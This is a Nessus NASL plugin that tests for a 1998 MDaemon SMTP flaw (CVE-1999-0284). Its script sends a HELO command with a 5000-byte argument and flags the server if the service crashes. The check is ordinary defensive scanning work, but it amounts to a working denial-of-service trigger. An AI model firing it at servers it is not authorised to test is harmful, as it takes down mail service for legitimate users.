#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10136);
 script_version ("$Revision: 1.34 $");
 script_cve_id("CVE-1999-0284");
 script_bugtraq_id(8555, 8621, 8622);
 script_osvdb_id(
  126,
  202,
  5855,
  6031,
  6117,
  6118,
  58016,
  58018
 );

 script_name(english:"MDaemon SMTP HELO Command Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server may be affected by a buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote SMTP server by sending a too long
argument to the HELO command.  This allows an unauthenticated, remote
attacker to deny service to legitimate users of the server. 

It may also indicate the service is affected by a buffer overflow
vulnerability which, if true, would allow an attacker to execute
arbitrary code on the affected host, subject to the privileges under
which the service operates." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1998/Mar/87" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a fix." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1998/03/11");
 script_cvs_date("$Date: 2016/10/27 15:03:55 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Crashes the remote MTA");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

d = smtp_recv_banner(socket:soc);
s = 'HELO ' + crap(5000) + '\r\n';
  send(socket:soc, data:s);
  close(soc);
  
if (service_is_dead(port: port) > 0)
  security_hole(port);
